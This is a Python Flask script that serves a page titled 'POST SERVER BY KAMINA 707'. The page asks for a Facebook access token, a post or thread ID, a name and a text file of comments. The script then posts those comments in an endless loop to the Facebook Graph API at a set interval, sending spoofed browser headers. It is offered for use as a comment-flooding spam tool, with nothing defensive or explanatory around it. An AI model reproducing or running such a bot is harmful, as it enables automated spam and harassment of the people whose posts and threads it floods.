from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝐊𝐀𝐌𝐈𝐍𝐀 𝟕𝟎𝟕</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{
      background-color: red;
    }
    .container{
      max-width: 500px;
      background-color: bisque;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(red,green,blue,alpha);
      margin: 0 auto;
      margin-top: 20px;
    }
    .header{
      text-align: center;
      padding-bottom: 20px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 20px;
      color: brown;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mb-3"> 𝐏𝐎𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑
                                     𝐁𝐘
    𝐊𝐀𝐌𝐈𝐍𝐀 𝟕𝟎𝟕>3:)
    <h1 class="mt-3">𝐎𝐖𝐍𝐄𝐑{•------» 𝐊𝐀𝐌𝐈𝐍𝐀  </h1>
  </header>

  <div class="container">
    <form action="/" method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="accessToken">𝐄𝐍𝐓𝐄𝐑 𝐘𝐎𝐔𝐑 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐓𝐎𝐊𝐄𝐍:</label>
        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
      </div>
      <div class="mb-3">
        <label for="threadId">𝐄𝐍𝐓𝐄𝐑 𝐏𝐎𝐒𝐓 𝐋𝐈𝐍𝐊:</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx">𝐄𝐍𝐓𝐄𝐑 𝐏𝐎𝐒𝐓 𝐎𝐖𝐍𝐄𝐑 𝐍𝐀𝐌𝐄:</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="txtFile">Select Your Comment file:</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
      </div>
      <div class="mb-3">
        <label for="time">𝐄𝐍𝐓𝐄𝐑 𝐂𝐎𝐌𝐌𝐄𝐍𝐒 𝐒𝐏𝐄𝐄𝐃:</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Start server</button>
    </form>
  </div>
  <footer class="footer">
    <p>&copy; 𝐃𝐄𝐕𝐋𝐎𝐏𝐄𝐏𝐄𝐑 𝐁𝐘 𝐊𝐀𝐌𝐈𝐍𝐀 𝟐𝟎𝟐𝟒. 𝐀𝐋𝐋 𝐑𝐈𝐆𝐇𝐓𝐒 𝐓𝐄𝐒𝐄𝐑𝐕𝐄𝐃.</p>
    <p>🥵𝐎𝐅𝐅 𝐋𝐈𝐍𝐄 𝐏𝐎𝐒𝐓 𝐒𝐄𝐑𝐕𝐄𝐑 𝐓𝐎𝐎𝐋𝐒🥵</p>
    <p>𝐊𝐄𝐄𝐏 𝐄𝐍𝐉𝐎𝐈𝐍𝐆  <a href="https://github.com/</a></p>
  </footer>
</body>
  </html>
    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    app.run(debug=True)
